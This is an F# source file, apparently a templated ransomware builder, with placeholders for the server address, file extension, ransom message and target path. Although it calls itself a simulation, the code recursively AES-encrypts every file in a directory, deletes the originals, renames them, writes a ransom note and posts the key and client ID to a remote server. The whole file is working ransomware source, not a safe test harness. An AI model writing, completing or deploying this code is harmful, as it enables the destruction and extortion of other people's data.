open System
open System.IO
open System.Security.Cryptography
open System.Text
open System.Net.Http

// Function to generate a random AES key and IV (Initialization Vector)
let generateAesKeyAndIv () =
    let aes = Aes.Create()
    aes.KeySize <- 256
    aes.GenerateKey()
    aes.GenerateIV()
    (aes.Key, aes.IV)

// Function to generate a unique client ID
let generateClientId () =
    Guid.NewGuid().ToString("N")

// Function to encrypt a file using AES and change its extension to {CUSTOM_EXTENSION}
let encryptFile (filePath: string, key: byte[], iv: byte[]) =
    let aes = Aes.Create()
    aes.Key <- key
    aes.IV <- iv
    let encryptedFilePath = Path.ChangeExtension(filePath, "{CUSTOM_EXTENSION}")
    use fsInput = new FileStream(filePath, FileMode.Open, FileAccess.Read)
    use fsOutput = new FileStream(encryptedFilePath, FileMode.Create, FileAccess.Write)
    use cryptoStream = new CryptoStream(fsOutput, aes.CreateEncryptor(), CryptoStreamMode.Write)
    let buffer = Array.zeroCreate<byte> 1024
    let mutable bytesRead = 0
    while (bytesRead <- fsInput.Read(buffer, 0, buffer.Length)) > 0 do
        cryptoStream.Write(buffer, 0, bytesRead)
    fsInput.Close()
    File.Delete(filePath)
    printfn "Encrypted and renamed file: %s -> %s" filePath encryptedFilePath

// Function to add the note.txt file with client ID and decryption info
let addNoteFile (directoryPath: string, clientId: string, decryptionKey: string, iv: string) =
    let noteContent = "{MESSAGE}\nYour client ID is: {CLIENT_ID}\nDecryption Key: {DECRYPTION_KEY}\nIV: {IV}"
    File.WriteAllText(Path.Combine(directoryPath, "{NOTE_FILE}"), noteContent)
    printfn "Note added to: %s" directoryPath

// Function to send the decryption key and client ID to a server as a backup
let sendDecryptionKeyToServer (clientId: string, decryptionKey: string, iv: string) =
    let client = new HttpClient()
    let content = new StringContent($"Client ID: {clientId}\nKey: {decryptionKey}\nIV: {iv}")
    let result = client.PostAsync("http://{SERVER_IP}/storekey", content).Result
    printfn "Client ID {clientId} and decryption key sent to server"

// Function to check if the file extension is sensitive
let isSensitiveFile (filePath: string) =
    let sensitiveExtensions = [{EXCLUDE_EXTENSIONS}]
    let ext = Path.GetExtension(filePath).ToLower()
    sensitiveExtensions |> List.contains ext

// Main function to simulate ransomware encryption
let simulateRansomware (directoryPath: string) =
    let (aesKey, aesIv) = generateAesKeyAndIv()
    let keyBase64 = Convert.ToBase64String(aesKey)
    let ivBase64 = Convert.ToBase64String(aesIv)
    let clientId = generateClientId()
    let files = Directory.GetFiles(directoryPath, "*.*", SearchOption.AllDirectories)
    for file in files do
        if not (isSensitiveFile file) then
            encryptFile(file, aesKey, aesIv)
    addNoteFile(directoryPath, clientId, keyBase64, ivBase64)
    sendDecryptionKeyToServer(clientId, keyBase64, ivBase64)

simulateRansomware "{PATH_TO_ENCRYPT}"
